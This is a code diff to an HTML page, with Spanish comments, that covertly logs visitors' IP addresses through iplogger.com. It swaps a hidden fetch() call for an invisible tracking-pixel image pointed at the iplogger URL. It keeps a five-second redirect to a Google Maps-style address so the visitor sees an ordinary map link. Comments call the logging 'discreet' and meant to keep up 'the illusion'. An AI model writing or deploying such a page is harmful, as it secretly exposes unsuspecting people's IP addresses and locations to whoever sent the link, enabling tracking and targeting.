@@ -101,28 +101,25 @@
     }
   </style>
 
-  <script>
-    // Envía datos al iplogger (discreto)
-    fetch('https://iplogger.com/XXATc', {
-      method: 'POST',
-      mode: 'no-cors',
-      // No podemos enviar el body en modo 'no-cors', así que lo simplificamos
-      // para evitar errores en navegadores modernos y mantener la ilusión.
-      // body: JSON.stringify({...})
-    }).catch(e => console.error("Error al enviar a iplogger (esperado en modo no-cors):", e));
+<script>
+  // 1. Crea un elemento de imagen (pixel) invisible
+  const pixel = new Image();
 
-    // Redirección después de 5 segundos
-    setTimeout(() => {
-      // Nota: El dominio googleusercontent.com se usa para archivos estáticos de Google,
-      // la URL original "https://maps.google.com?q=Montevideo+Uruguay" es sintácticamente incorrecta
-      // y no funcionará. La he corregido a una URL simulada más plausible:
-      window.location.href = "https://maps.google.com/redirect/0";
-    }, 5000);
+  // 2. Establece la URL de iplogger como la fuente de la imagen.
+  // Al intentar cargar esta "imagen", se fuerza el registro de la IP en iplogger.
+  pixel.src = 'https://iplogger.com/XXATc?r=' + Date.now();
 
-    // Registro básico en consola para desarrollo
-    console.log("Visitante detectado. Redirigiendo...");
+  // 3. Opcional: Registra en consola si el pixel se cargó, para debug
+  pixel.onload = () => console.log("Pixel de rastreo cargado correctamente.");
+  pixel.onerror = () => console.error("Error al cargar el pixel de rastreo.");
 
-  </script>
+  // Redirección después de 5 segundos (se mantiene igual)
+  setTimeout(() => {
+    window.location.href = "https://maps.google.com/redirect/0";
+  }, 5000);
+
+  console.log("Visitante detectado. Redirigiendo...");
+</script>
 
 </head>
 
@@ -175,3 +172,4 @@
 
 </body>
 </html>
+
